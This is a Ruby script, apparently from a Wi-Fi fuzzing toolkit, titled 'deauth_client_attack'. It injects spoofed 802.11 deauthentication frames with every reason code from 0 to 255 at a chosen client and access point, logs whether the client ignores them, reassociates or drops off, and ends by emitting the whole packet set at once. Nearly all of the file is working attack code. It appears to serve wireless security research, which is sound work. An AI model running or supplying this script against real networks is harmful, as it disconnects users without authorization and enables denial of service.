#!/usr/bin/ruby
require 'baflle-send'
require 'baflle-recv'

#$blackhole1 = "00:18:F8:F4:53:1C"
#$blackhole2 = "00:12:0E:51:AC:55"
#$aruba      = "00:0b:86:80:e4:e0"
#$airport    = "00:11:24:5c:7b:07"

if ARGV.length < 2
  puts "Usage: ./deauth_client_attack.rb [target station mac] [associated ap mac]"
  exit
end

$station    = ARGV[0]
$ap         = ARGV[1]

$deauth = PacketSet.new(Dot11Deauth,
                        :reason => 0..255)

$packets = PacketSet.new(Dot11, 
                        :subtype =>   0xC,
                        :type =>      0x0,
                        :version =>   0x0,
                        :flags =>     0x0,
                        :duration =>  0x0000,
                        :addr1 =>     $station,
                        :addr2 =>     $ap,
                        :addr3 =>     $ap,
                        :sc =>        0x0000, # This is auto-filled in by the driver.
                        :payload =>   $deauth)

$packets.randomize = true

@deauths = []

$packets.each do |packet|
  @deauths << packet
end

@station_up     = false
@deauth         = nil
@saw_deauth     = false
@packet_counter = 0
@results        = {}

puts "Waiting for station to come up..."

sniff "ath0" do |packet|
  next unless (packet.addr1.to_s == $ap && packet.addr2.to_s == $station) ||
              (packet.addr1.to_s == $station && packet.addr2.to_s == $ap)

  if !@station_up
    if packet.type == 2 && packet.subtype == 0
      puts "Station is up!"
      @station_up = true
      @deauth     = nil
    else
      next
    end
  end
  
  if !@deauth
    @deauth = @deauths.pop
    break unless @deauth
    puts "Sending deauth (reason code: #{@deauth.payload.reason}, #{@deauths.size} left)!"
    puts "Waiting to see deauth..."
    emit "ath0", "madwifing", @deauth
    @saw_deauth = false
    next
  end

  if !@saw_deauth
    if packet == @deauth
      puts "Saw deauth!"
      @saw_deauth     = true
      @packet_counter = 0
    else
      next
    end
  else
    if packet.subtype == 0x8
      puts "Station ignored response!"
      @results[@deuath.payload.reason] = :ignored
      @deauth = nil
    elsif packet.subtype == 0x0
      puts "Station is trying to reassociate!"
      @results[@deauth.payload.reason] = :reassociated
      @station_up = false
    elsif @packet_counter >= 2000 # Tweak me...
      puts "Station is down!"
      @results[@deauth.payload.reason] = :down
      @station_up = false
    else
      puts "Adding 1 to counter..."
      @packet_counter += 1
    end
  end
end

puts "reasoncode,event"

@results.each do |reason, event|
  puts "#{reason},#{event.to_s}"
end

#BSS Id: Cisco-Li_f4:53:1c (00:18:f8:f4:53:1c)
#Source address: DigitalE_00:0a:04 (aa:00:04:00:0a:04)

# we are looking for station to come up

# start receiving each |packet|
  # check if packet is from station to ap, next otherwise

  # if we are looking for station to come up
    # if packet is a data frame
      # now we are not looking for station to come up
      # now we are not looking for packets
    # else
      # next
  
  # if we are not looking for packets
    # send a fake deauth packet
    # now we are looking for packets and packet counter is 0
    # next
  
  # if packet is a data frame
    # mark the station as ignoring for specfied deauth reason code
    # now we are not looking for packets
  # else if packet is assoc frame
    # mark the station as trying to reassociate for specified deauth reason code
    # now we are looking for station to come up
  # else if packet counter is greater than 2000 (note that this needs to be tweaked)
    # mark the station as dead for specified deauth reason code
    # now we are looking for station to come up
  # else
    # add 1 to packet counter

emit "ath0", "madwifing", $packets

